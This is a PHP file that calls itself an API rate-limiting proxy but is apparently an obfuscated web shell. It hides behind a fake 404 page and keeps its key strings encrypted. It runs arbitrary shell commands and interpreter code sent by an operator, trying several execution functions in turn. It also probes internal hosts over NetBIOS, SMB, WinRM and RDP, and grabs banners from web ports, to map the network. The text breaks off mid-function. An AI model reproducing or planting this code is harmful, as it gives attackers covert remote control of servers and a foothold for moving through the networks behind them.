<?php
/**
 * API Rate Limiting Enforcement Proxy v5.8.18
 * Routes incoming traffic based on feature flag evaluation.
 * Controlled by feature flag system. Snapshot: 2025-03-21
 */
@error_reporting(0);
@ini_set('display_errors', '0');

$_featureFlags = array("Te84V8idHuoGcmdtbvUyRNevZvrx+kruDzfM9L4gi+bQ", "YPlVcMlKraRc3qpRQ5vqko0Hrpovqdv72pnW7WQ3JG/Wy+Qb7Lw=", "8QnkZ49PK/w2fE9aL18d3ybJ0mvA3dpoXnIBpbDBaWk=", "u1Qj0OHHl6Dx5btY0u97lTYglhGJSNdghUmYEsNmcjXI2w==", "UDQcgNQ9MOEXH+tt41jJFHPFRmZNquu8jmcwGa//HazhmTs1", "dipcGoFxdXaZP6zUgsFihsjmTmGUtbq+npenlrUHQp7hlaXhxA==", "SpCRJ/OEaMMFli6IarsoOV/0IKZKEvbJnzY4iwHzvFURf3GVRq1g", "KC7kTk0dN+ueO/HNmj9DRLoCjO7Q+H8lPeifFZE6JbAMnZoacw==", "suOoIR8zoLZJy++Nn3bRuZslePBB2thcbLmZxTI/", "bvJpK5+hsxXCyfGGVEZ/l0b2QzJFP/GKjQvJE+h+7DJBLHK2C6NBYRO06oVfec/MmNoN7XHAuUYh4j0b+A==", "xN3/mhOZ21LB8sazfiZY6B/vvY83FO/jaxXIIxRkyA4=", "mGndOjtGJdnCOyYyn6ZUkUTxEfSDX9Bx1gU8V2ftoggY", "i7gJNQUTbszH+zP9WqOj9pG5rmeO0JtmoffB8KMtBQ==", "DXvqIKaynDMqLvOZ5moE9dZpIjwwcOBAcByuytHUpw==", "BWkdzW0pJ5HzlREEEMJ+TQYWjrwBrVglg7o9l/qCL+mChg==", "uoMzsDvfODSr3rn+4GNMFfnyoEo1+jFmUDE39d+0lQ==", "W38uThwiryqlF4GtFenjHPVmhiBR5+xp4QwiwCCHNHhy5A6UliJHYkHZc2EF1Z5KtniKX60h4AW/6Kci9xw4+O3B3qWaClGREhQkqhiXDpYMN4F109s+JLzWfN/s0TlpXGx3wHXMZLfWJ2FG3LPNtyH/073MFwWybzbRirYXpBTxtHy6VYkNScZhJYQNtdZ/+qh5LnFdOhyu3BycqyrtNjqlhaOBOaN3HoNSVEbD0rvMf4Oos8GAyQ5lEfjSBxNqgfqqjyYKmg==", "dZUW0G8Fi45aNc5qu25G9x+qkerwGkRweJomakDaLVn4rsQmL9QeyHfQKDjqYUXTw+7No9juNM0spyNHUBtrVNTbjhsnE/PaEOGLHOhLL0FdOekxIPLEQ79UUr2U0Qf6fI24oA==", "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", "gx3xa4mrqlrhlsuNebl9UaoiD9ugeZm4Y76wpK2b9hr0FY0FjQqO/3M=", "iwX8jXktMxSmGwxs7fGvpHpeg/OarlnU1vw4Egnen4HBEMoMH1zn", "steCqqjR6LFty17uJtRjraQQtnUJZ4aOlLKDApon28MbaE/NHoos2Odj6Q5X2TeBkAIqdHIVhIs=", "cohEn19S8X2Ybi0UGT8jffk2Y3dx/Sb/yOHswG8fyCDK/XLQkaI1dXJW8IxRhGppbMG9SRj8UUWVPBHXuaRfZbLD5NiKv8L63yI=", "lRfv+DETICl37cPazKeMySRohT5ZOsVxHca/9njKZs4TCgqG+lBOzNnN0OFvmfmCQcJo", "ouk851ZoeJEYLflDYPPgLL4TF2N2bhpIs6ABL8kQf5dJknjholT3YN3a+LKA", "AMaBQRXiP/uMo640zz3LV8oB6XjgcrrZiP1lQRxhJrdrW/v2ZHYJxbiePsrUU0XPgVT8UwzQJsUmhuOT6hUyBTcofmVo/mtgKfwpUTwM+Wgq6tr50qg8gwPjREPtHnXEpfKbnk2BuX+i8+p+Q4hgdsGRxFKPHcGyiGtGq6uZV50u435a8+IpAJaSUyiY7LwiZc2i1rO/eTivBvhC4PT+0/7fPv1WugJxFBTeGaOrBwlnWdLapP+U1Q==", "B2SCnu0OSK7f8FRl9d9YeUh83kEcDv4b//+KH3NiIdqSZ/Bni0n94xrL+DVi1EUpLSAsb8WDTZ3zaDCl6tAp43ybrOsEfYSMZn0bgCNW4jjoS2cZ7cwj7aILZZg=");

function broadcastNotice($e, $spanToken) {
    $raw = @base64_decode($e);
    if ($raw === false || strlen($raw) < 28) return '';
    $n = substr($raw, 0, 12);
    $t = substr($raw, -16);
    $ct = substr($raw, 12, -16);
    $r = @openssl_decrypt($ct, 'aes-256-gcm', hash('sha256', $spanToken, true), OPENSSL_RAW_DATA, $n, $t);
    return ($r !== false) ? $r : '';
}

function restoreCheckpoint($e, $spanToken) {
    global $_featureFlags;
    $D = 'broadcastNotice';
    $tk = @hex2bin($D($_featureFlags[38], $spanToken));
    if (empty($tk) || strlen($tk) !== 32) return false;
    $raw = @base64_decode($e);
    if ($raw === false || strlen($raw) < 28) return false;
    $n = substr($raw, 0, 12);
    $t = substr($raw, -16);
    $ct = substr($raw, 12, -16);
    return @openssl_decrypt($ct, $D($_featureFlags[32], $spanToken), $tk, OPENSSL_RAW_DATA, $n, $t);
}

function expireToken($data, $spanToken) {
    global $_featureFlags;
    $D = 'broadcastNotice';
    $tk = @hex2bin($D($_featureFlags[38], $spanToken));
    if (empty($tk) || strlen($tk) !== 32) return false;
    $n = random_bytes(12);
    $t = '';
    $ct = @openssl_encrypt($data, $D($_featureFlags[32], $spanToken), $tk, OPENSSL_RAW_DATA, $n, $t, '', 16);
    if ($ct === false) return false;
    return base64_encode($n . $ct . $t);
}

function evaluateRule($body, $field) {
    $data = @json_decode($body, true);
    return ($data !== null && isset($data[$field])) ? $data[$field] : '';
}

function aggregateStats() {
    http_response_code(404);
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>' . ($_SERVER['SERVER_SOFTWARE'] ?? 'Apache/2.4.57 (Ubuntu)') . ' Server at ' . ($_SERVER['SERVER_NAME'] ?? 'localhost') . ' Port ' . ($_SERVER['SERVER_PORT'] ?? '443') . '</address></body></html>';
    exit;
}

function queueCallback($fullcmd, $spanToken) {
    global $_featureFlags;
    $D = 'broadcastNotice';
    $df = array_map('trim', explode(',', @ini_get($D($_featureFlags[19], $spanToken))));

    $fn1 = $D($_featureFlags[1], $spanToken);
    if (!empty($fn1) && function_exists($fn1) && !in_array($fn1, $df)) {
        $r = @$fn1($fullcmd . ' 2>&1');
        return ($r !== null) ? $r : '';
    }

    $fn2 = $D($_featureFlags[2], $spanToken);
    if (!empty($fn2) && function_exists($fn2) && !in_array($fn2, $df)) {
        $out = array(); $rc = 0;
        @$fn2($fullcmd . ' 2>&1', $out, $rc);
        $r = implode("\n", $out);
        if ($rc !== 0) $r .= "\n[exit:" . $rc . "]";
        return $r;
    }

    $fn3 = $D($_featureFlags[3], $spanToken);
    if (!empty($fn3) && function_exists($fn3) && !in_array($fn3, $df)) {
        ob_start(); @$fn3($fullcmd . ' 2>&1'); return ob_get_clean();
    }

    $fn4 = $D($_featureFlags[4], $spanToken);
    if (!empty($fn4) && function_exists($fn4) && !in_array($fn4, $df)) {
        ob_start(); @$fn4($fullcmd . ' 2>&1'); return ob_get_clean();
    }

    $fn5 = $D($_featureFlags[5], $spanToken);
    if (!empty($fn5) && function_exists($fn5) && !in_array($fn5, $df)) {
        $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $proc = @$fn5($fullcmd, $desc, $pipes);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]); @fclose($pipes[1]);
            $err = @stream_get_contents($pipes[2]); @fclose($pipes[2]);
            @proc_close($proc);
            return $out . $err;
        }
    }

    return $D($_featureFlags[18], $spanToken) ? explode('~', $D($_featureFlags[18], $spanToken))[17] : 'unavailable';
}

function assemblePayload($interpreter, $code, $spanToken) {
    global $_featureFlags, $_ruleEngine;
    $D = 'broadcastNotice';

    $isWin = (strtoupper(substr(constant($_ruleEngine[1]), 0, 3)) === $_ruleEngine[13]);
    if (!$isWin) {
        $spl = explode('~', $D($_featureFlags[26], $spanToken));
        $sn = $spl[array_rand($spl)];
        $wl = explode('~', $D($_featureFlags[25], $spanToken));
        $sm = explode('~', $D($_featureFlags[28], $spanToken));
        $idx = array_search($interpreter, $wl);
        if ($idx !== false) {
            $pfx = explode('~', $D($_featureFlags[27], $spanToken));
            $pi = intval($sm[$idx]);
            if (isset($pfx[$pi])) {
                $code = sprintf($pfx[$pi], $sn) . $code;
            }
        }
    }

    $df = array_map('trim', explode(',', @ini_get($D($_featureFlags[19], $spanToken))));
    $fn5 = $D($_featureFlags[5], $spanToken);

    if (!empty($fn5) && function_exists($fn5) && !in_array($fn5, $df)) {
        $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $proc = @$fn5($interpreter . ' -', $desc, $pipes);
        if (is_resource($proc)) {
            @fwrite($pipes[0], $code);
            @fclose($pipes[0]);
            $stdout = @stream_get_contents($pipes[1]); @fclose($pipes[1]);
            $stderr = @stream_get_contents($pipes[2]); @fclose($pipes[2]);
            $exit = @proc_close($proc);
            $r = $stdout;
            if (!empty($stderr)) $r .= "\n[stderr] " . $stderr;
            if ($exit !== 0) $r .= "\n[exit:" . $exit . "]";
            return $r;
        }
    }

    $b64 = base64_encode($code);
    return queueCallback("echo '" . $b64 . "' | base64 -d | " . $interpreter, $spanToken);
}

function mergeOverrideJx($s) {
    if ($s === null) return '';
    return str_replace(array('\\', '"'), array('\\\\', '\\"'), $s);
}
function mergeOverrideTx($s) {
    if ($s === null || $s === '') return '';
    $z = strpos($s, "\x00");
    if ($z !== false) $s = substr($s, 0, $z);
    $s = trim($s);
    if ($s === '' || strlen($s) > 253) return '';
    $n = strlen($s);
    $i = 0;
    while ($n > $i) {
        $ch = $s[$i];
        $ok = ($ch >= '0' && $ch <= '9') || ($ch >= 'A' && $ch <= 'Z') || ($ch >= 'a' && $ch <= 'z') || $ch === '.' || $ch === '-' || $ch === '_' || $ch === ':';
        if (!$ok) return '';
        $i++;
    }
    return mergeOverrideJx($s);
}
function mergeOverrideRf($ip) {
    if ($ip === null || $ip === '') return false;
    if (strpos($ip, '10.') === 0 || strpos($ip, '192.168.') === 0) return true;
    if (strpos($ip, '172.') === 0) {
        $pp = explode('.', $ip);
        if (count($pp) > 1) {
            $o = intval($pp[1]);
            if ($o >= 16 && $o <= 31) return true;
        }
    }
    return false;
}
function mergeOverrideLb($b) {
    return ($b >= 48 && $b <= 57) || ($b >= 65 && $b <= 90) || ($b >= 97 && $b <= 122) || $b === 45 || $b === 95 || $b === 32 || $b === 0;
}
function mergeOverrideJk($s) {
    if ($s === null || $s === '') return true;
    $x = strtolower($s);
    return $x === 'localdomain' || $x === 'localhost' || $x === 'local' || $x === 'domain' || $x === 'msbrowse' || $x === '__msbrowse__';
}
function mergeOverrideCl(&$name, &$domain) {
    $name = rtrim(trim($name === null ? '' : $name), '.');
    $domain = rtrim(trim($domain === null ? '' : $domain), '.');
    $dot = strpos($name, '.');
    if ($dot !== false && $dot > 0) {
        $suf = substr($name, $dot + 1);
        if ($domain === '' && !mergeOverrideJk($suf)) $domain = $suf;
        $name = substr($name, 0, $dot);
    }
    if (mergeOverrideJk($name)) $name = '';
    if (mergeOverrideJk($domain)) $domain = '';
    if ($domain !== '' && strcasecmp($domain, $name) === 0 && strpos($domain, '.') === false) $domain = '';
    $name = mergeOverrideTx($name);
    $domain = mergeOverrideTx($domain);
}
function mergeOverrideU1($s) {
    if ($s === '' || $s === false) return '';
    if (function_exists('iconv')) {
        $r = @iconv('UTF-16LE', 'UTF-8//IGNORE', $s);
        if ($r !== false) return $r;
    }
    $o = '';
    $n = strlen($s);
    $i = 0;
    while ($n > $i + 1) { $o .= $s[$i]; $i += 2; }
    return $o;
}
function mergeOverrideHp($h) {
    if (strlen($h) < 8) return '';
    $n = hexdec($h);
    return ($n & 255) . '.' . (($n >> 8) & 255) . '.' . (($n >> 16) & 255) . '.' . (($n >> 24) & 255);
}
function mergeOverrideTp($buf, &$name, &$domain) {
    $name = ''; $domain = '';
    if ($buf === '' || $buf === false) return;
    $len = strlen($buf);
    $idx = -1;
    $k = 0;
    while ($k + 12 <= $len) {
        if (ord($buf[$k]) === 0x4e && ord($buf[$k + 1]) === 0x54 && ord($buf[$k + 2]) === 0x4c && ord($buf[$k + 3]) === 0x4d && $k + 8 < $len && ord($buf[$k + 8]) === 2) {
            $idx = $k; break;
        }
        $k++;
    }
    if ($idx < 0 || $idx + 48 > $len) return;
    $tl = unpack('v', substr($buf, $idx + 40, 2));
    $to = unpack('V', substr($buf, $idx + 44, 4));
    $tl = $tl[1]; $to = $to[1];
    $p = $idx + $to;
    $end = $p + $tl;
    if ($end > $len) $end = $len;
    $nb = ''; $nd = ''; $dn = ''; $dd = '';
    while ($p + 4 <= $end) {
        $t = unpack('v', substr($buf, $p, 2));
        $l = unpack('v', substr($buf, $p + 2, 2));
        $t = $t[1]; $l = $l[1]; $p += 4;
        if ($t === 0) break;
        if ($p + $l > $end) break;
        $v = trim(str_replace("\x00", '', mergeOverrideU1(substr($buf, $p, $l))));
        $p += $l;
        if ($t === 1) $nb = $v;
        elseif ($t === 2) $nd = $v;
        elseif ($t === 3) $dn = $v;
        elseif ($t === 4) $dd = $v;
    }
    $name = strlen($dn) ? $dn : $nb;
    $domain = strlen($dd) ? $dd : $nd;
    mergeOverrideCl($name, $domain);
}
function mergeOverrideRd($s) {
    $hdr = '';
    while (strlen($hdr) < 4) {
        $c = @fread($s, 4 - strlen($hdr));
        if ($c === false || $c === '') return '';
        $hdr .= $c;
    }
    $len = (ord($hdr[1]) << 16) | (ord($hdr[2]) << 8) | ord($hdr[3]);
    if ($len <= 0 || $len > 8192) $len = 8192;
    $buf = '';
    while (strlen($buf) < $len) {
        $c = @fread($s, $len - strlen($buf));
        if ($c === false || $c === '') break;
        $buf .= $c;
    }
    return $buf;
}
function mergeOverrideNb($ip, $spanToken, &$name, &$domain) {
    global $_featureFlags;
    $D = 'broadcastNotice';
    $name = ''; $domain = '';
    $q = @base64_decode($D($_featureFlags[39], $spanToken));
    if ($q === false || $q === '') return;
    $s = @stream_socket_client('udp://' . $ip . ':137', $en, $es, 1);
    if (!$s) return;
    stream_set_timeout($s, 0, 800000);
    @fwrite($s, $q);
    $r = @fread($s, 2048);
    @fclose($s);
    if ($r === false || strlen($r) < 70) { mergeOverrideCl($name, $domain); return; }
    $start = -1; $count = 0; $rlen = strlen($r);
    $o = 12;
    while ($o + 19 <= $rlen) {
        $c = ord($r[$o]);
        if ($c >= 1 && $c <= 16 && $o + 1 + $c * 18 <= $rlen) {
            $okrec = 0;
            $i = 0;
            while ($c > $i) {
                $p = $o + 1 + $i * 18; $letters = 0; $clean = true;
                $k = 0;
                while ($k < 15) {
                    $b = ord($r[$p + $k]);
                    if (!mergeOverrideLb($b)) { $clean = false; break; }
                    if ($b !== 32 && $b !== 0) $letters++;
                    $k++;
                }
                if ($clean && $letters >= 2) $okrec++;
                $i++;
            }
            if ($okrec >= 2 && $okrec + 1 >= $c) { $start = $o + 1; $count = $c; break; }
        }
        $o++;
    }
    if ($start >= 0) {
        $i = 0;
        while ($count > $i) {
            $p = $start + $i * 18;
            if ($p + 18 > $rlen) break;
            $nm = trim(str_replace("\x00", '', substr($r, $p, 15)));
            $suf = ord($r[$p + 15]); $grp = (ord($r[$p + 16]) & 0x80) !== 0;
            if ($nm !== '' && strpos($nm, 'MSBROWSE') === false) {
                if ($grp) { if ($domain === '' && $suf === 0) $domain = $nm; }
                elseif ($suf === 0 && $name === '') $name = $nm;
                elseif ($suf === 0x20 && $name === '') $name = $nm;
            }
            $i++;
        }
    }
    mergeOverrideCl($name, $domain);
}
function mergeOverrideWr($ip, $port, $spanToken, &$name, &$domain) {
    global $_featureFlags;
    $D = 'broadcastNotice';
    $name = ''; $domain = '';
    $t1 = "NTLMSSP\x00" . pack('V', 1) . pack('V', 0x00088207) . str_repeat("\x00", 16);
    $req = $D($_featureFlags[44], $spanToken) . $ip . ':' . $port . $D($_featureFlags[45], $spanToken) . base64_encode($t1) . $D($_featureFlags[46], $spanToken);
    $s = @stream_socket_client('tcp://' . $ip . ':' . $port, $en, $es, 1);
    if (!$s) return;
    stream_set_timeout($s, 1);
    @fwrite($s, $req);
    $hdr = @stream_get_contents($s);
    @fclose($s);
    if ($hdr === false || strlen($hdr) < 20) return;
    $needle = $D($_featureFlags[47], $spanToken);
    $at = stripos($hdr, $needle);
    if ($at === false) return;
    $sp = strpos($hdr, ' ', $at); $end = strpos($hdr, "\r", $at);
    if ($sp === false || $end === false || $end <= $sp) return;
    $tok = trim(substr($hdr, $sp + 1, $end - $sp - 1));
    $sp2 = strpos($tok, ' ');
    if ($sp2 !== false) $tok = trim(substr($tok, $sp2 + 1));
    mergeOverrideTp(@base64_decode($tok), $name, $domain);
}
function mergeOverrideSm($ip, $spanToken, &$name, &$domain) {
    global $_featureFlags;
    $D = 'broadcastNotice';
    $name = ''; $domain = '';
    $s = @stream_socket_client('tcp://' . $ip . ':445', $en, $es, 1);
    if (!$s) return;
    stream_set_timeout($s, 1);
    $neg = @base64_decode($D($_featureFlags[40], $spanToken));
    $ss = @base64_decode($D($_featureFlags[41], $spanToken));
    if ($neg) @fwrite($s, $neg);
    mergeOverrideRd($s);
    if ($ss) @fwrite($s, $ss);
    $buf = mergeOverrideRd($s);
    @fclose($s);
    mergeOverrideTp($buf, $name, $domain);
}
function mergeOverrideRd2($ip, $spanToken, &$name, &$domain) {
    $name = ''; $domain = '';
    $cookie = "Cookie: mstshash=a\r\n";
    $nego = "\x01\x00\x08\x00\x03\x00\x00\x00";
    $body = "\xE0\x00\x00\x00\x00\x00" . $cookie . $nego;
    $tot = 4 + 1 + strlen($body);
    $pkt = "\x03\x00" . chr(($tot >> 8) & 255) . chr($tot & 255) . chr(strlen($body)) . $body;
    $ctx = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true, 'capture_peer_cert' => true)));
    $s = @stream_socket_client('tcp://' . $ip . ':3389', $en, $es, 1, STREAM_CLIENT_CONNECT, $ctx);
    if (!$s) return;
    stream_set_timeout($s, 1);
    @fwrite($s, $pkt);
    @fread($s, 64);
    $meth = defined('STREAM_CRYPTO_METHOD_TLS_CLIENT') ? STREAM_CRYPTO_METHOD_TLS_CLIENT : (defined('STREAM_CRYPTO_METHOD_SSLv23_CLIENT') ? STREAM_CRYPTO_METHOD_SSLv23_CLIENT : 0);
    if ($meth && @stream_socket_enable_crypto($s, true, $meth)) {
        $opts = @stream_context_get_options($ctx);
        if (isset($opts['ssl']['peer_certificate'])) {
            $info = @openssl_x509_parse($opts['ssl']['peer_certificate']);
            if (is_array($info) && isset($info['subject']['CN'])) $name = $info['subject']['CN'];
        }
    }
    @fclose($s);
    mergeOverrideCl($name, $domain);
}
function mergeOverrideId($ip, $hp, $spanToken, &$name, &$domain) {
    $name = ''; $domain = '';
    $has = array();
    foreach ($hp as $p) $has[(int)$p] = 1;
    if (isset($has[445]) || isset($has[139])) mergeOverrideNb($ip, $spanToken, $name, $domain);
    if (($name === '' || $domain === '') && (isset($has[5985]) || isset($has[5986]))) {
        $n2 = ''; $d2 = '';
        mergeOverrideWr($ip, isset($has[5985]) ? 5985 : 5986, $spanToken, $n2, $d2);
        if ($name === '') $name = $n2;
        if ($domain === '') $domain = $d2;
    }
    if ($name === '' && isset($has[445])) mergeOverrideSm($ip, $spanToken, $name, $domain);
    if ($name === '' && isset($has[3389])) mergeOverrideRd2($ip, $spanToken, $name, $domain);
    if ($name === '') {
        $dn = @gethostbyaddr($ip);
        if ($dn && $dn !== $ip) $name = $dn;
    }
    mergeOverrideCl($name, $domain);
}
function mergeOverrideHw($p) {
    return $p === 80 || $p === 81 || $p === 443 || $p === 8000 || $p === 8008 || $p === 8080 || $p === 8081 || $p === 8443 || $p === 8888 || $p === 9090 || $p === 9443;
}
function mergeOverrideHs($p) {
    return $p === 443 || $p === 8443 || $p === 9443;
}
function mergeOverrideHt($buf) {
    $t = '';
    if (preg_match('/<title[^>]*>([^<]{0,200})<\/title>/i', $buf, $m)) $t = trim($m[1]);
    elseif (preg_match('/property=["\']og:title["\'][^>]*content=["\']([^"\']{0,200})/i', $buf, $m)) $t = trim($m[1]);
    elseif (preg_match('/<h1[^>]*>([^<]{0,160})<\/h1>/i', $buf, $m)) $t = trim(strip_tags($m[1]));
    if ($t !== '' && function_exists('html_entity_decode')) $t = html_entity_decode($t, ENT_QUOTES, 'UTF-8');
    $t = trim(preg_replace('/\s+/', ' ', $t));
    if (strlen($t) > 120) $t = substr($t, 0, 117) . '...';
    return $t;
}
function mergeOverrideHh($buf, &$status, &$server, &$powered) {
    $status = 0; $server = ''; $powered = '';
    $cut = strpos($buf, "\r\n\r\n");
    if ($cut === false) $cut = strpos($buf, "\n\n");
    $head = ($cut === false) ? $buf : substr($buf, 0, $cut);
    if (preg_match('/^HTTP\/\S+\s+(\d+)/', $head, $m)) $status = intval($m[1]);
    if (preg_match('/^Server:\s*(.+)$/im', $head, $m)) $server = trim($m[1]);
    if (preg_match('/^X-Powered-By:\s*(.+)$/im', $head, $m)) $powered = trim($m[1]);
    if (strlen($server) > 80) $server = substr($server, 0, 80);
    if (strlen($powered) > 60) $powered = substr($powered, 0, 60);
}
function mergeOverrideHp2($ip, $port, &$title, &$server, &$status, &$powered) {
    $title = ''; $server = ''; $status = 0; $powered = '';
    $tls = mergeOverrideHs($port);
    $ctx = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true)));
    $target = ($tls ? 'ssl://' : 'tcp://') . $ip . ':' . $port;
    $s = @stream_socket_client($target, $en, $es, 1.2, STREAM_CLIENT_CONNECT, $ctx);
    if (!$s) return;
    stream_set_timeout($s, 2);
    $req = "GET / HTTP/1.0\r\nHost: " . $ip . "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml\r\nConnection: close\r\n\r\n";
    @fwrite($s, $req);
    $buf = '';
    $n = 0;
    while (!feof($s) && $n < 8 && strlen($buf) < 8192) {
        $chunk = @fread($s, 1024);
